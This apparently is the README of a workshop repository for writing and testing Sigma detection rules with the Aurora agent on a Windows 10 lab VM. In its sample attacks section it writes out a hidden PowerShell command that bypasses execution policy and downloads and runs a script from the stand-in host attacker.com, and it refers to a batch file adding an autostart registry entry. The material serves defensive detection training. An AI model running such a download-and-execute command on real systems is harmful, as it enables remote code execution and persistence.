# Live_Let_Sigma
Files used in Sigma Rules Workshop: Live and Let Sigma

- Sigma rules
- Aurora Agent Batch files
- python helper scripts
- attck files
- attacker web files

## How to setup the VM for testing

- Setup Windows 10 Virtual machine in any of your prefered Virtulization Environment
- Install 7zip , notepad++ (Or any other editor you support YAML syntax hightlight)
- Copy and extract all archives to C:\ folder
- Add following line at the end of C:\Windows\System32\drivers\etc\hosts file
  `127.0.0.1       attacker.com`
- Install python 3.14.2 or higher version in Windows 10 VM
- Run command python -m pip install -r C:\sigma_test_repo\requirements.txt
- Register for Aurora Lite agent at https://www.nextron-systems.com/aurora/
- Confirm Email and then login with same account
- Just download License file and copy it to the folder C:\aurora-agent-lite-win-pack\
- Now you are ready to create and test sigma rule files

## Command to start the Custom Aurora Agent

```
C:\>cd aurora-agent-lite-win-pack

C:\aurora-agent-lite-win-pack>start_custom_agent.bat

```
Output would be something like:
<img width="1201" height="817" alt="image" src="https://github.com/user-attachments/assets/0d8e1282-f00a-40c9-b4fb-c4c377157def" />

## Open Dashbord
- Right click on Aurora Icon near bottom right of windows taskbar
- Click on Open Dashboard
- If dashboard not opened just paste url http://localhost:17494/ui/dashboard/overview in the browser and open
<img width="1350" height="745" alt="image" src="https://github.com/user-attachments/assets/51f081e7-e5e1-422d-933f-f2a509b0970d" />

## Instruction after adding new fule file
- New rule files are to be stored with yml extension
- validate new file using following command
  `python C:\sigma_test_repo\validate_sigma.py C:\custom_sigma_rules\YOUR_SIGMA_FILE_NAME.yml`
- Stop the Aurora Agent by opening its windows and press Ctrl+C
- Start Aurora Agent commands given in section "Command to start the Custom Aurora Agent"

## Start simulated attacker web server
= Run following command
`C:\aurora-agent-lite-win-pack\web_server_start.bat`

## Sample attack files and written rule files which were shown in workshop (some bonus attacks also added)
1. Add auto start registry entry
  ```
  Windows + R -> cmd.exe
  cd c:\attack
  attack01.bat
  ```

2. Run Following command
   ```
   powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
   ```

## Bonus 
- Checkout extra attack files in the c:\attack folder
- See what type of attack they are doing
- Try to create Sigma rules to raise alert for these attacks

## Issues
- For any errors in files raise a issue in the github repo

## Contributions 
- You can create attack with YOUR_ATTACK_NAME.bat
- and sigma rule with YOUR_ATTACK_NAME.yml
- add both of these files to folder new_attack in repo


